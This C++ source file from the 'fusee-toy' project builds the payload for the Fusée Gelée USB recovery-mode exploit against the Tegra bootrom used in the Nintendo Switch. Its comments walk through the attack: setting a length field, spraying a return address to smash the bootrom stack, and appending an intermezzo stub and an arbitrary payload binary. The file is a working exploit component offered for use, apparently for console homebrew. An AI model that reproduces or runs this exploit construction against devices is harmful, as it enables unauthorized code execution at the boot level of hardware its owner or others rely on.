/*
*   This file is part of fusee-toy
*   Copyright (C) 2022 Swiftloke
*
*   This program is free software: you can redistribute it and/or modify
*   it under the terms of the GNU General Public License as published by
*   the Free Software Foundation, either version 3 of the License, or
*   (at your option) any later version.
*
*   This program is distributed in the hope that it will be useful,
*   but WITHOUT ANY WARRANTY; without even the implied warranty of
*   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*   GNU General Public License for more details.
*
*   You should have received a copy of the GNU General Public License
*   along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*   Additional Terms 7.b and 7.c of GPLv3 apply to this file:
*       * Requiring preservation of specified reasonable legal notices or
*         author attributions in that material or in the Appropriate Legal
*         Notices displayed by works containing it.
*       * Prohibiting misrepresentation of the origin of that material,
*         or requiring that modified versions of such material be marked in
*         reasonable ways as different from the original version.
*/

//
// Created by Swiftloke on 1/1/21.
//

#include <stdexcept>
#include "PayloadConstructor.h"

void PayloadConstructor::write_u32_to_payload(u32 val, u32 loc)
{
//    char* ptr = payload.data() + loc;
//    u32* uptr = reinterpret_cast<u32*>(ptr);
//    *uptr = val;
    constexpr int bit_len_char = 8;
    for(int i = 0; i < 4; i++)
    {
        this->payload[loc + i] = static_cast<char>(val >> i * bit_len_char);
    }
}

PayloadConstructor::Payload& PayloadConstructor::GeneratePayload()
{
    //Here goes! Start by setting the "length" section of our payload command.
    //The rest can be left empty, since it's not super necessary.
    write_u32_to_payload(PAYLOAD_MAX_LENGTH, 0);

    //Pad the rest of the command with bytes for brevity.
    //This isn't strictly necessary because nothing except the length is
    //used before the vuln is triggered.
    for(this->rcx = sizeof(u32); this->rcx < RCM_CMD_LEN; this->rcx++)
        this->payload[this->rcx] = RCM_CMD_PADDING;

    //After this point, the bootrom has finished reading the "command"
    //(not much of one, is it?) and will now start reading the payload.
    //We'll now set up the stack smash- this following section overwrites
    //a return address when we trigger the vuln.
    //Note that we jump to Intermezzo first, as it's an intermediary
    //for the actual payload.

    for(int i = 0; i < PAYLOAD_ADDR_INTERMEZZO - PAYLOAD_ADDR_START; i += 4, this->rcx += 4)
        write_u32_to_payload(PAYLOAD_ADDR_INTERMEZZO, this->rcx);

    //Load intermezzo.
    std::copy(this->intermezzo_file.begin(), this->intermezzo_file.end(),
              this->payload.begin() + this->rcx);
    this->rcx += this->intermezzo_file.size();

    //Pad until the payload load address for brevity.
    //Again, not necessary, this data is unused.
    for(int i = 0; i < PAYLOAD_ADDR_PAYLOAD - PAYLOAD_ADDR_INTERMEZZO - intermezzo_file.size(); i++, this->rcx++)
        this->payload[this->rcx] = INTERMEZZO_PADDING;

    //Load the payload.
    std::copy(this->payload_file.begin(), this->payload_file.end(),
              this->payload.begin() + this->rcx);

    this->rcx += this->payload_file.size();
    this->len = this->rcx;
    //Done!
    return this->payload;
}

PayloadConstructor::PayloadConstructor(const char *intermezzo_file_loc, const char *payload_file_loc)
{
    this->intermezzo_fp = fopen(intermezzo_file_loc, "r");
    this->payload_fp = fopen(payload_file_loc, "r");

    if(intermezzo_fp == nullptr)
        throw std::runtime_error("Failed to open intermezzo file!");
    if(payload_fp == nullptr)
        throw std::runtime_error("Failed to open payload file!");

    fseek(this->intermezzo_fp, 0L , SEEK_END);
    long intermezzo_size = ftell(this->intermezzo_fp);
    rewind(this->intermezzo_fp);
    this->intermezzo_file.resize(intermezzo_size);
    fread(&intermezzo_file[0], 1, intermezzo_size, this->intermezzo_fp);

    fseek(this->payload_fp, 0L , SEEK_END);
    long payload_size = ftell(this->payload_fp);
    rewind(this->payload_fp);
    this->payload_file.resize(payload_size);
    fread(&payload_file[0], 1, payload_size, this->payload_fp);

    fclose(this->intermezzo_fp);
    fclose(this->payload_fp);

    //this->payload is default constructed.
}